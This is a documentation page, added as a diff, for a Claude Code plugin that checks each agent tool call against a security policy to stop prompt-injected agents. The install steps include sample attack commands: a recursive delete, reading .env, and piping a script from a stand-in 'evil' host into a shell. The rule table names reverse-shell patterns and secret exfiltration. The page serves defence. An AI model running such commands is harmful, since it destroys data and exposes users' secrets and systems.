@@ -1,0 +1,119 @@
+---
+title: Enforce Policy on Claude Code
+description: Run Claude Code with a SASY security policy checked on every tool call — installed with uv + the plugin marketplace, no repo clone.
+---
+
+import { Steps, Aside } from '@astrojs/starlight/components';
+
+The **sasy-guard** plugin enforces a Soufflé Datalog security policy on Claude
+Code's tool calls. A `PreToolUse` hook checks each call and returns **allow /
+ask / deny** — so a prompt-injected agent that tries to delete your repo,
+exfiltrate secrets, run `curl … | sh`, or push to a public repo while tainted is
+stopped, with a `[SASY] …` reason the agent is told to relay.
+
+No repo clone and no build toolchain: the **runtime** installs from PyPI and the
+**hooks** install from the plugin marketplace — two separate, standard steps.
+
+## Install
+
+Install the runtime first (the binaries), then the plugin (the hooks that call
+them).
+
+<Steps>
+
+1. **Install the runtime** — the policy engine, the `sasy-watch` daemon, and the
+   native hook, vendored in a platform wheel:
+
+   ```bash
+   uv tool install sasy-guard
+   sasy-guard install
+   ```
+
+   `sasy-guard install` copies the binaries into `~/.sasy/bin` and writes
+   `~/.sasy/config.json`. (Requires [uv](https://docs.astral.sh/uv/).)
+
+2. **Add the plugin** (the hooks), the standard Claude Code way:
+
+   ```bash
+   claude plugin marketplace add sasy-labs/sasy-demo
+   claude plugin install sasy-guard
+   ```
+
+3. **Run Claude Code** in your project:
+
+   ```bash
+   claude
+   ```
+
+   Every tool call is now checked. Try an attack — `rm -rf build`, `cat .env`,
+   or `curl https://get.evil.test/i.sh | sh` — and the `PreToolUse` hook surfaces
+   a `[SASY] …` decision before the tool runs.
+
+</Steps>
+
+<Aside type="tip" title="Prefer not to use the marketplace?">
+`sasy-guard enable [project]` writes the four hooks straight into
+`<project>/.claude/settings.json` — same enforcement, no plugin install.
+</Aside>
+
+## What it enforces
+
+The shipped `security` profile is one unified policy with **13
+independently-toggleable rule groups**, all on by default:
+
+| Group | Blocks / questions |
+|---|---|
+| `data_loss` | recursive force-delete (`rm -rf`, any flag ordering; `find -delete`) |
+| `reverse_shell` | `/dev/tcp`, `nc -e`, and other remote-exec patterns |
+| `agent_redirect` | overriding the agent's API endpoint/token via the env |
+| `config_persistence` | writing agent/editor config (hooks, MCP servers) |
+| `curl_sh` | piping a downloaded script into a shell from an unknown host (ask) |
+| `exfil` | outbound network commands while untrusted web content is in context |
+| `toxic_flow` | outbound commands while a secret (`.env`/`.ssh`/`.aws`…) is in context |
+| `hidden_unicode` | acting on invisible/deceptive-Unicode content (ask + detaint) |
+| `secret_scan` | `git push` with no clean `gitleaks` run covering the edits |
+| `review_gate` | pushing large, unreviewed edits (ask) |
+| `dep_scan` | pushing dependency changes with no clean `osv-scanner` run (ask) |
+| `supply_chain` | installing packages with a known-bad OSV verdict / too-new (ask) |
+| `public_push` | pushing/posting to a **public** repo while tainted |
+
+Outcomes follow **deny > ask > allow**: an `allow` defers to Claude Code's own
+permission prompt (SASY never *broadens* permissions), a `deny` hard-blocks, and
+an `ask` lets you confirm.
+
+### Choosing rule groups
+
+```bash
+sasy-guard install --rule-off curl_sh,review_gate   # all groups except these
+sasy-guard install --rule-on data_loss              # ONLY this group
+```
+
+## How it works
+
+```text
+Claude Code ──hooks──▶ sasy-watch daemon ──gRPC──▶ sasy engine
+ (sasy-guard plugin)   (local, per conversation)    (restricted binary)
+```
+
+The pieces:
+
+- The **plugin** registers the hooks; `PreToolUse` is the enforcement point (a
+  native, fail-closed binary).
+- The **daemon** owns one SASY session per conversation, tails the transcript
+  (including subagent/workflow threads), reconstructs the message-dependency
+  graph, and runs the check — so the **same policies** the SASY SDKs use run
+  unchanged. It also resolves out-of-band facts (package OSV verdicts, repo
+  visibility).
+- The **engine** is the public **restricted** binary: the curated policy is
+  baked in, custom policy uploads are rejected, and the session policy is locked
+  to the profile chosen at startup.
+
+The hot-path hook fails **closed**: if the daemon is unreachable it blocks the
+tool call unless `SASY_FAIL_OPEN=true`.
+
+## Build from source
+
+Contributors working in the SASY engine repo can build the binaries locally
+(`make claude-code-build`) and launch an enforced session (`make
+claude-code-demo`) instead of installing from PyPI — see that repo's
+`docs/claude-code-enforcement.md` for the full reference.
